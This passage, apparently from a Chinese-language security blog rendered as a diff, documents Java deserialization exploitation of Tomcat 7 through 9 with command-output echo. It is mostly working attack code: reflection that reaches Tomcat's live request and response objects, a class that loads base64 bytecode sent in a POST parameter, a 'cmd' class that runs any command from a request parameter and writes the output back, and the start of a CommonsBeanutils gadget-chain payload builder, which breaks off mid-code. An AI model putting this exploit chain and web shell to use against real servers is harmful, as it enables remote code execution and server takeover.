+ <span class="n">Field</span> <span class="n">handler</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;org.apache.coyote.AbstractProtocol&#34;</span><span class="o">).</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;handler&#34;</span><span class="o">);</span>
+ <span class="n">handler</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+ <span class="n">AbstractEndpoint</span><span class="o">.</span><span class="na">Handler</span> <span class="n">AChandler</span> <span class="o">=</span> <span class="o">(</span><span class="n">AbstractEndpoint</span><span class="o">.</span><span class="na">Handler</span><span class="o">)</span> <span class="n">handler</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">abstractProtocol</span><span class="o">);</span>
+
+ <span class="n">Field</span> <span class="n">global</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;org.apache.coyote.AbstractProtocol$ConnectionHandler&#34;</span><span class="o">).</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;global&#34;</span><span class="o">);</span>
+ <span class="n">global</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+ <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">coyote</span><span class="o">.</span><span class="na">RequestGroupInfo</span> <span class="n">requestGroupInfo</span> <span class="o">=</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">coyote</span><span class="o">.</span><span class="na">RequestGroupInfo</span><span class="o">)</span> <span class="n">global</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">AChandler</span><span class="o">);</span>
+
+ <span class="n">Field</span> <span class="n">processors</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;org.apache.coyote.RequestGroupInfo&#34;</span><span class="o">).</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;processors&#34;</span><span class="o">);</span>
+ <span class="n">processors</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+ <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">List</span><span class="o">&lt;</span><span class="n">RequestInfo</span><span class="o">&gt;</span> <span class="n">RequestInfo_list</span> <span class="o">=</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">List</span><span class="o">&lt;</span><span class="n">RequestInfo</span><span class="o">&gt;)</span> <span class="n">processors</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">requestGroupInfo</span><span class="o">);</span>
+
+ <span class="n">Field</span> <span class="n">req</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;org.apache.coyote.RequestInfo&#34;</span><span class="o">).</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;req&#34;</span><span class="o">);</span>
+ <span class="n">req</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+ <span class="k">for</span> <span class="o">(</span><span class="n">RequestInfo</span> <span class="n">requestInfo</span> <span class="o">:</span> <span class="n">RequestInfo_list</span><span class="o">)</span> <span class="o">{</span>
+
+     <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">coyote</span><span class="o">.</span><span class="na">Request</span> <span class="n">request1</span> <span class="o">=</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">coyote</span><span class="o">.</span><span class="na">Request</span><span class="o">)</span> <span class="n">req</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">requestInfo</span><span class="o">);</span>
+     <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">connector</span><span class="o">.</span><span class="na">Request</span> <span class="n">request2</span> <span class="o">=</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">connector</span><span class="o">.</span><span class="na">Request</span><span class="o">)</span> <span class="n">request1</span><span class="o">.</span><span class="na">getNote</span><span class="o">(</span><span class="n">1</span><span class="o">);</span>
+     <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">connector</span><span class="o">.</span><span class="na">Response</span> <span class="n">response2</span> <span class="o">=</span> <span class="n">request2</span><span class="o">.</span><span class="na">getResponse</span><span class="o">();</span>
+     <span class="c1">//可添加条件，通过header来判断指定请求（不然内容会写到其他请求中去）
+</span><span class="c1"></span>     <span class="n">response2</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="s">&#34;111&#34;</span><span class="o">);</span>
+
+ <span class="o">}</span>
+ <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+     <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+ <span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+<li>
+<p>defineClass异常回显；URLClassLoader异常回显；RMI绑定实例回显；</p>
+<p>参考: <a href="https://www.cnblogs.com/nice0e3/p/14945707.html" target="_blank" rel="noopener">https://www.cnblogs.com/nice0e3/p/14945707.html</a></p>
+</li>
+</ol>
+<h3 id="回显实现"><a href="#回显实现" class="anchor-link">#</a><a href="#contents:回显实现" class="headings">回显实现</a></h3>
+<ol>
+<li>
+<p>适用于Tomcat 7、8、9。已解决请求头长度限制问题（从Post请求中获取字节码加载）</p>
+<p>Tomcat 6无法利用（调试CommonsBeanutils和cc11利用链发现，反序列化时无法获取<code>[[B</code>的class类型。tomcat6的WebappClassLoader类加载器和子类加载器都找不到<code>[[B</code>的类）</p>
+<p><strong>TD类代码实现</strong></p>
+<p>该类是在TemplatesImpl加载的字节码的类，该类中从Acceptor线程中获取request和response对象，获取请求Post参数中的字节码base64解码后，加载调用对象的equals方法（传入获取request和response对象）。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">deserialize</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Iterator</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">TD</span> <span class="o">{</span>
+    <span class="kd">static</span> <span class="o">{</span>
+        <span class="n">Object</span> <span class="n">jioEndPoint</span> <span class="o">=</span> <span class="n">GetAcceptorThread</span><span class="o">();</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">jioEndPoint</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">ArrayList</span> <span class="n">processors</span> <span class="o">=</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">ArrayList</span><span class="o">)</span> <span class="n">getField</span><span class="o">(</span><span class="n">getField</span><span class="o">(</span><span class="n">getField</span><span class="o">(</span><span class="n">jioEndPoint</span><span class="o">,</span> <span class="s">&#34;handler&#34;</span><span class="o">),</span> <span class="s">&#34;global&#34;</span><span class="o">),</span> <span class="s">&#34;processors&#34;</span><span class="o">);</span>
+            <span class="n">Iterator</span> <span class="n">iterator</span> <span class="o">=</span> <span class="n">processors</span><span class="o">.</span><span class="na">iterator</span><span class="o">();</span>
+            <span class="k">while</span> <span class="o">(</span><span class="n">iterator</span><span class="o">.</span><span class="na">hasNext</span><span class="o">())</span> <span class="o">{</span>
+                <span class="n">Object</span> <span class="n">next</span> <span class="o">=</span> <span class="n">iterator</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
+                <span class="n">Object</span> <span class="n">req</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">next</span><span class="o">,</span> <span class="s">&#34;req&#34;</span><span class="o">);</span>
+                <span class="n">Object</span> <span class="n">serverPort</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">req</span><span class="o">,</span> <span class="s">&#34;serverPort&#34;</span><span class="o">);</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">serverPort</span><span class="o">.</span><span class="na">equals</span><span class="o">(-</span><span class="n">1</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="k">continue</span><span class="o">;</span>
+                <span class="o">}</span>
+                <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">connector</span><span class="o">.</span><span class="na">Request</span> <span class="n">request</span> <span class="o">=</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">connector</span><span class="o">.</span><span class="na">Request</span><span class="o">)</span> <span class="o">((</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">coyote</span><span class="o">.</span><span class="na">Request</span><span class="o">)</span> <span class="n">req</span><span class="o">).</span><span class="na">getNote</span><span class="o">(</span><span class="n">1</span><span class="o">);</span>
+                <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">connector</span><span class="o">.</span><span class="na">Response</span> <span class="n">response</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getResponse</span><span class="o">();</span>
+                <span class="n">String</span> <span class="n">code</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;wangdefu&#34;</span><span class="o">);</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">code</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">try</span> <span class="o">{</span>
+                        <span class="kt">byte</span><span class="o">[]</span> <span class="n">classBytes</span> <span class="o">=</span> <span class="k">new</span> <span class="n">sun</span><span class="o">.</span><span class="na">misc</span><span class="o">.</span><span class="na">BASE64Decoder</span><span class="o">().</span><span class="na">decodeBuffer</span><span class="o">(</span><span class="n">code</span><span class="o">);</span>
+                        <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Method</span> <span class="n">defineClassMethod</span> <span class="o">=</span> <span class="n">ClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;defineClass&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="kt">byte</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">});</span>
+                        <span class="n">defineClassMethod</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                        <span class="n">Class</span> <span class="n">cc</span> <span class="o">=</span> <span class="o">(</span><span class="n">Class</span><span class="o">)</span> <span class="n">defineClassMethod</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">TD</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">(),</span> <span class="n">classBytes</span><span class="o">,</span> <span class="n">0</span><span class="o">,</span> <span class="n">classBytes</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
+                        <span class="n">cc</span><span class="o">.</span><span class="na">newInstance</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">});</span>
+                    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                        <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+                    <span class="o">}</span>
+                <span class="o">}</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">getField</span><span class="o">(</span><span class="n">Object</span> <span class="n">object</span><span class="o">,</span> <span class="n">String</span> <span class="n">fieldName</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">Field</span> <span class="n">declaredField</span><span class="o">;</span>
+        <span class="n">Class</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">object</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
+        <span class="k">while</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">!=</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">try</span> <span class="o">{</span>
+
+                <span class="n">declaredField</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldName</span><span class="o">);</span>
+                <span class="n">declaredField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                <span class="k">return</span> <span class="n">declaredField</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">object</span><span class="o">);</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="o">}</span>
+            <span class="n">clazz</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getSuperclass</span><span class="o">();</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">GetAcceptorThread</span><span class="o">()</span> <span class="o">{</span>
+        <span class="n">Thread</span><span class="o">[]</span> <span class="n">threads</span> <span class="o">=</span> <span class="o">(</span><span class="n">Thread</span><span class="o">[])</span> <span class="n">getField</span><span class="o">(</span><span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getThreadGroup</span><span class="o">(),</span> <span class="s">&#34;threads&#34;</span><span class="o">);</span>
+        <span class="k">for</span> <span class="o">(</span><span class="n">Thread</span> <span class="n">thread</span> <span class="o">:</span> <span class="n">threads</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">thread</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="n">thread</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;exec&#34;</span><span class="o">))</span> <span class="o">{</span>
+                <span class="k">continue</span><span class="o">;</span>
+            <span class="o">}</span>
+            <span class="k">if</span> <span class="o">((</span><span class="n">thread</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;Acceptor&#34;</span><span class="o">))</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">thread</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;http&#34;</span><span class="o">)))</span> <span class="o">{</span>
+                <span class="n">Object</span> <span class="n">target</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">thread</span><span class="o">,</span> <span class="s">&#34;target&#34;</span><span class="o">);</span>
+                <span class="k">if</span> <span class="o">(!(</span><span class="n">target</span> <span class="k">instanceof</span> <span class="n">Runnable</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="k">try</span> <span class="o">{</span>
+                        <span class="n">Object</span> <span class="n">target2</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">thread</span><span class="o">,</span> <span class="s">&#34;this$0&#34;</span><span class="o">);</span>
+                        <span class="n">target</span> <span class="o">=</span> <span class="n">thread</span><span class="o">;</span>
+                    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                        <span class="k">continue</span><span class="o">;</span>
+                    <span class="o">}</span>
+                <span class="o">}</span>
+                <span class="n">Object</span> <span class="n">jioEndPoint</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">target</span><span class="o">,</span> <span class="s">&#34;this$0&#34;</span><span class="o">);</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">jioEndPoint</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">try</span> <span class="o">{</span>
+                        <span class="n">jioEndPoint</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">target</span><span class="o">,</span> <span class="s">&#34;endpoint&#34;</span><span class="o">);</span>
+                    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                        <span class="k">continue</span><span class="o">;</span>
+                    <span class="o">}</span>
+                <span class="o">}</span>
+                <span class="k">return</span> <span class="n">jioEndPoint</span><span class="o">;</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>cmd类代码实现</p>
+<p>该类的字节码会被base64编码后，放在wangdefu请求参数中。在TD类中获取该参数并加载。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">deserialize</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.io.InputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Scanner</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">cmd</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">equals</span><span class="o">(</span><span class="n">Object</span> <span class="n">req</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">Object</span><span class="o">[]</span> <span class="n">context</span><span class="o">=(</span><span class="n">Object</span><span class="o">[])</span> <span class="n">req</span><span class="o">;</span>
+        <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">connector</span><span class="o">.</span><span class="na">Request</span> <span class="n">request</span><span class="o">=(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">connector</span><span class="o">.</span><span class="na">Request</span><span class="o">)</span><span class="n">context</span><span class="o">[</span><span class="n">0</span><span class="o">];</span>
+        <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">connector</span><span class="o">.</span><span class="na">Response</span> <span class="n">response</span><span class="o">=(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">connector</span><span class="o">.</span><span class="na">Response</span><span class="o">)</span><span class="n">context</span><span class="o">[</span><span class="n">1</span><span class="o">];</span>
+        <span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;cmd&#34;</span><span class="o">);</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">cmd</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">response</span><span class="o">.</span><span class="na">setContentType</span><span class="o">(</span><span class="s">&#34;text/html;charset=utf-8&#34;</span><span class="o">);</span>
+                <span class="n">InputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">();</span>
+                <span class="n">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Scanner</span><span class="o">(</span><span class="n">in</span><span class="o">).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">&#34;\\\\a&#34;</span><span class="o">);</span>
+                <span class="n">String</span> <span class="n">output</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">s</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="s">&#34;&#34;</span><span class="o">;</span>
+                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;----------------------------------&#34;</span><span class="o">);</span>
+                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">println</span><span class="o">(</span><span class="n">output</span><span class="o">);</span>
+                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;----------------------------------&#34;</span><span class="o">);</span>
+                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">flush</span><span class="o">();</span>
+                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">close</span><span class="o">();</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p><strong>run类代码实现</strong></p>
+<p>通过CommonsBeanutils利用链加载TD类的字节码，生成序列化数据。获取cmd类的字节码，并base64编码输出。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">deserialize</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javassist.ClassClassPath</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javassist.ClassPool</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javassist.CtClass</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.beanutils.BeanComparator</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Base64</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.PriorityQueue</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">run</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="c1">//获取字节码
+</span><span class="c1"></span>            <span class="n">ClassPool</span> <span class="n">pool</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
+            <span class="n">pool</span><span class="o">.</span><span class="na">insertClassPath</span><span class="o">(</span><span class="k">new</span> <span class="n">ClassClassPath</span><span class="o">(</span><span class="n">deserialize</span><span class="o">.</span><span class="na">run</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClass</span><span class="o">()));</span>
+            <span class="n">CtClass</span> <span class="n">ctClass</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&#34;deserialize.TD&#34;</span><span class="o">);</span>
